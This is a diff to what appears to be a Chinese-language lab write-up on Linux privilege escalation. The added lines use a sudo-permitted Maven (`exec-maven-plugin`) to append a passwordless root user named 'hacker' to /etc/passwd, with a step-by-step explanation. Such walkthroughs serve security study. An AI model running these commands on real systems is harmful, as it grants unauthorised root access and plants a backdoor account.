@@ -763,4 +763,12 @@ uid=1002(terra536) gid=1002(terra536) groups=1002(terra536)
 先写好pom.xml然后用maven拉取，拉取的时候就执行了里面的命令加上了suid，看到加成功了，但是不知道为什么提权还是失败了。
 不能这样提权，那就尝试一下添加一个用户
 用root权限加一个有root权限的用户
-exec-maven-plugin
+这里换了`exec-maven-plugin`插件，就不用写`pom`文件了
+```bash
+bash-5.2# echo 'hacker::0:0:root:/root:/bin/bash' > /tmp/newpasswd
+bash-5.2# sudo /usr/bin/mvn exec:exec -Dexec.executable=/bin/sh -Dexec.args="-c 'cat /tmp/newpasswd >> /etc/passwd'"
+```
+- 以 root 运行 Maven
+- Maven 执行 `/bin/sh`
+- `sh` 执行 `cat /tmp/newpasswd >> /etc/passwd`
+- **root 往 `/etc/passwd` 里添加了一行**
